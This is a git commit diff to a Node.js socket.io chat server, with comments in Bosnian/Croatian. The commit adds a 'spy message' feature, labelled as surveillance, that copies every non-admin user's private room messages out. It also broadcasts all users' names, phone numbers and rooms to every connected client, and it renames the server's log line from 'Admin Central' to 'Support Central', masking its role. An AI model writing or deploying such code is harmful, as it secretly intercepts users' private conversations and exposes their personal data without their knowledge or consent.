1e8d6417b899b032dd72428d0038c25b8652624d
merkelovski666-jpg <merkelovski666@gmail.com>
2026-03-30 14:31:29 +0200

    Update server.js

--- server.js
+++ server.js
@@ -5,31 +5,43 @@ const io = require('socket.io')(server);
 
 app.use(express.static(__dirname));
 
-let activeUsers = {}; // Ovdje čuvamo listu online korisnika
+let activeUsers = {};
+const ADMIN_PHONE = "00387603344334";
 
 io.on('connection', (socket) => {
     socket.on('join', (data) => {
         socket.join(data.room);
-        // Spasimo korisnika u listu
         activeUsers[socket.id] = { 
             name: data.name, 
             phone: data.phone, 
+            room: data.room,
             id: socket.id 
         };
-        // Pošalji svima osvježenu listu (ili samo adminu, ali ovako je lakše za test)
-        io.emit('update users', Object.values(activeUsers));
-        console.log(`Povezan: ${data.name} (${data.phone})`);
+        
+        // Obavijesti Admina o novom korisniku i njegovoj sobi
+        io.emit('admin update', Object.values(activeUsers));
     });
 
     socket.on('chat message', (data) => {
+        // Šalje poruku u sobu (normalan chat)
         io.to(data.room).emit('chat message', data);
+        
+        // AKO NIJE ADMIN: Pošalji kopiju Adminu (Nadzor)
+        if (data.phone !== ADMIN_PHONE) {
+            io.emit('spy message', {
+                from: data.name,
+                text: data.text,
+                room: data.room,
+                time: new Date().toLocaleTimeString()
+            });
+        }
     });
 
     socket.on('disconnect', () => {
         delete activeUsers[socket.id];
-        io.emit('update users', Object.values(activeUsers));
+        io.emit('admin update', Object.values(activeUsers));
     });
 });
 
 const PORT = process.env.PORT || 3000;
-server.listen(PORT, () => console.log('Admin Central Server Online'));
+server.listen(PORT, () => console.log('Support Central Online'));
